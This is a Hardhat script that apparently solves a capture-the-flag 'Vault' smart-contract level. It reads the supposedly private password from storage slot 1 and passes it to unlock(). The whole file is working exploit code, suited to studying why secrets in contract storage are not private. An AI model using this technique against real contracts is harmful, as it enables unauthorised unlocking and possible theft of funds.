import { ethers } from "hardhat";
const CONTRACT_ADDRESS = "0x8701f1d16d08a9f2Ae120AF155977b431Fa32b51";
const PLAYER_ADDRESS = "0x81215d34367AF48d01E728AfF2976d9Df32fE604";
const ATTACKER_CONTRACT = "";

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  const contract = await ethers.getContractAt(
    "Vault",
    CONTRACT_ADDRESS,
    signer
  );

  const slot1 = await ethers.provider.getStorageAt(CONTRACT_ADDRESS, 1);
  // the slot data looks like this -> "0x412076657279207374726f6e67207365637265742070617373776f7264203a29";

  console.log(`The password is: ${slot1}`);

  // see if the contracted returns `false` for unlocked
  console.log("Is the contract locked", await contract.locked());

  // send password by passing storage slot
  console.log(await contract.unlock(slot1));

  // see if the contracted returns `true` for unlocked
  console.log(await contract.locked());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
